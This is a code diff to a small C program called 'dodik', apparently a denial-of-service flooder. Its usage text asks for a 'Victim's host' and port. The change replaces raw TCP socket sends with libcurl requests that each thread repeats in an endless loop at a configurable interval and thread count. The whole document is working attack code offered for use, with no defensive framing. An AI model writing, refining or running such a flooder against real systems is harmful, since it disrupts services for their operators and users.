@@ -2,17 +2,16 @@
 #include <stdlib.h>
 #include <string.h>
 #include <pthread.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
 #include <unistd.h>
-#include <arpa/inet.h>
+#include <curl/curl.h>
 
 struct data {
-	char const *ip;
+	char const *host;
 	char const *port;
 	int timeout;
 };
+
+void *writefunction(char *buffer, size_t size, size_t nitem, void *n);
 
 void *threadSend(void *args);
 
@@ -21,9 +20,9 @@ int main(int const argc, char const **argv)
 	if (argc < 6) {
 		printf("\nError: too few arguments\n");
 		printf("\nUsage: dodik [opt1] [value1] [opt2] [value2] ... \n\n");
-		printf("Option\tDescription\n");
-		printf("  -i  \t(MUST BE) Victim's IP-address\n");
-		printf("  -p  \t(MUST BE) Victim's IP-port\n");
+		printf("Option\tDescrhosttion\n");
+		printf("  -h  \t(MUST BE) Victim's host\n");
+		printf("  -p  \t(MUST BE) Victim's port\n");
 		printf("  -t  \t(optional) Count threads; def.val.=1\n");
 		printf("  -s  \t(optional) Interval between sending packages; def.val.=0\n\n");
 		exit(EXIT_FAILURE);
@@ -33,15 +32,15 @@ int main(int const argc, char const **argv)
 	int count_threads = 0;
 	pthread_t *thread_arr = NULL;
 	struct data args = {0};
-	args.ip = NULL;
+	args.host = NULL;
 	args.port = NULL;
 	args.timeout = 0;
 	count_threads = 1;
 	
 	// Argument handling
 	for (int i = 1; i <= argc - 1; i += 2) {
-		if (strcmp(argv[i], "-i") == 0)
-			args.ip = argv[i + 1];
+		if (strcmp(argv[i], "-h") == 0)
+			args.host = argv[i + 1];
 		else if (strcmp(argv[i], "-p") == 0)
 			args.port = argv[i + 1];
 		else if (strcmp(argv[i], "-t") == 0) {
@@ -54,9 +53,9 @@ int main(int const argc, char const **argv)
 	}
 
 	// Checking must haves variables
-	if (args.ip == NULL || args.port == NULL) {
-		if (args.ip == NULL)
-			printf("Error: you didn't enter IP-address\n");
+	if (args.host == NULL || args.port == NULL) {
+		if (args.host == NULL)
+			printf("Error: you didn't enter host-address\n");
 		if (args.port == NULL)
 			printf("Error: you didn't enter port\n");
 		free(thread_arr);
@@ -76,23 +75,24 @@ int main(int const argc, char const **argv)
 	return 0;
 }
 
+void *writefunction(char *buffer, size_t size, size_t nitem, void *n)
+{
+	return NULL;
+}
+
 void *threadSend(void *args)
 {
-	char const *ip = ((struct data*) args)->ip;
+	char const *host = ((struct data*) args)->host;
 	char const *port = ((struct data*) args)->port;
 	int timeout = ((struct data*) args)->timeout;
 	
-	int sock = socket(AF_INET, SOCK_STREAM, 0);
-	struct sockaddr_in address = {0};
-	address.sin_family = AF_INET;
-	inet_pton(AF_INET, ip, &address.sin_addr);
-	address.sin_port = htons(atoi(port));
-	
-	connect(sock, (struct sockaddr *) &address, sizeof(address));
-
-	char buf[64];
+	CURL *curl = NULL;
+	curl = curl_easy_init();
+	curl_easy_setopt(curl, CURLOPT_URL, host);
+	curl_easy_setopt(curl, CURLOPT_PORT, atoi(port));
+	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunction);
 	while (1) {
-		send(sock, buf, 64, 0);
+		curl_easy_perform(curl);
 		usleep(timeout * 1000000);
 	}
 }
